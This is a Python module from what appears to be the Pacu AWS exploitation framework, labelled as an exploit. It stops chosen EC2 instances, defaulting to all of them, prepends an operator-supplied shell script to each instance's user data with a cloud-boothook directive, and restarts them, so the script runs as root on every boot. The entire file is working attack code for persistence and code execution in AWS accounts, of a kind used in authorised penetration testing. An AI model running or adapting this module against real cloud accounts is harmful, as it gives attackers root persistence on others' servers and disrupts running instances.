#!/usr/bin/env python3
import argparse
import base64
from botocore.exceptions import ClientError
import time
import random


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'ec2__startup_shell_script',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/elevation/bouncy_bouncy_cloudy_cloud.py',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'EXPLOIT',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Stops and restarts EC2 instances to execute code.',

    # Description about what the module does and how it works
    'description': 'This module will attempt to stop the chosen EC2 instances, store/display the User Data that is already set for each EC2 instance, update it with a shell script (.sh) of your choosing, then start the instances again. The shell script will be executed as root/SYSTEM every time the specific instances are booted up.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['EC2'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['ec2__enum'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--script', '--instance-ids'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--script', required=True, help='File path of the shell script to add to the EC2 instances')
parser.add_argument('--instance-ids', required=False, default=None, help='One or more (comma separated) EC2 instance IDs and their regions in the format instanceid@region. Defaults to all instances.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    fetch_data = pacu_main.fetch_data
    get_regions = pacu_main.get_regions
    ######

    regions = get_regions('ec2')

    client = pacu_main.get_boto3_client('ec2', random.choice(regions))

    instances = []
    if args.instance_ids is not None:  # need to update this to include the regions of these IDs
        for instance in args.instance_ids.split(','):
            if "@" not in instance:
                print("Usage: <instance-id>@<region>   ex: i-abcdef12345@us-west-2")
                return({"error": "invalid usage"})
            instances.append({
                'InstanceId': instance.split('@')[0],
                'Region': instance.split('@')[1]
            })
    else:
        print('Targeting all EC2 instances...')
        if fetch_data(['EC2', 'Instances'], module_info['prerequisite_modules'][0], '--instances') is False:
            print('Sub-module run failed')
            return
        for instance in session.EC2['Instances']:
            instances.append({
                'InstanceId': instance['InstanceId'],
                'Region': instance['Region']
            })
    instance_count = 0
    for region in regions:
        client = pacu_main.get_boto3_client('ec2', region)
        for instance in instances:
            if instance['Region'] == region:
                result = stop_instance(client, instance['InstanceId'], print)
                if result:
                    update_userdata(client, instance['InstanceId'], prepare_user_data(client, instance['InstanceId'], args.script), print)
                    start_instance(client, instance['InstanceId'], print)
                    instance_count += 1
                else:
                    print('  {}@{} FAILED'.format(instance['InstanceId'], instance['Region']))
    return {'Instances': instance_count}


def summary(data, pacu_main):
    if data['Instances']:
        out = '  {} Instance(s) Modified'.format(data['Instances'])
    else:
        out = '  No Instances Modified'
    return out


def stop_instance(client, instance_id, print):
    print('Stopping {}'.format(instance_id))
    try:
        client.stop_instances(InstanceIds=[instance_id])
        return True
    except ClientError as error:
        code = error.response['Error']['Code']
        print('FAILURE: ')
        if code == 'UnauthorizedOperation':
            print('  Access denied to StopInstances.')
        else:
            print('  ' + code)
    return False


def start_instance(client, instance_id, print):
    print('Starting {}'.format(instance_id))
    try:
        client.start_instances(InstanceIds=[instance_id])
        return True
    except ClientError as error:
        code = error.response['Error']['Code']
        print('FAILURE: ')
        if code == 'UnauthorizedOperation':
            print('  Access denied to StartInstances.')
        else:
            print('  ' + code)
    return False


def prepare_user_data(client, instance_id, script):
    # TODO: Replace this with a fetch_data of download_ec2_userdata
    # This will error if the UserData is gzipped
    try:
        response = client.describe_instance_attribute(
            Attribute='userData',
            InstanceId=instance_id
        )
        user_data = ''
        if response['UserData']:
            user_data = base64.b64decode(response['UserData']['Value']).decode("utf-8")
            # Save the current data in case there is something sensitive
            # with open('output/scrapedUserData.txt', 'a+') as scraped_user_data_file:
            #     scraped_user_data_file.write('User data for instance id {}: {}\n'.format(instance_id, user_data))

        with open(script, 'r') as shell_script:
            # Append our script to their old user data to not screw up the instance
            user_data = '#cloud-boothook\n{}\n\n{}'.format(shell_script.read(), user_data)  # the #cloud-boothook directive is what runs the code every single time the EC2 starts. Regular old user data only runs on the first instance launch

        return user_data
    except ClientError as error:
        code = error.response['Error']['Code']
        print('FAILURE: ')
        if code == 'UnauthorizedOperation':
            print('  Access denied to DescribeInstanceAttribute.')
        else:
            print('  ' + code)
        return False


def update_userdata(client, instance_id, user_data, print):
    print('Setting User Data for {}'.format(instance_id))

    result = False
    code = 'IncorrectInstanceState'

    while(code == 'IncorrectInstanceState' and not result):
        try:
            client.modify_instance_attribute(
                InstanceId=instance_id,
                UserData={
                    'Value': user_data
                }
            )
            result = True
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'UnauthorizedOperation':
                print('  Access denied to ModifyInstanceAttribute.')
                return False
            elif code != 'IncorrectInstanceState':
                print(error.response['Error']['Message'])
                return False
            time.sleep(5)

    return result
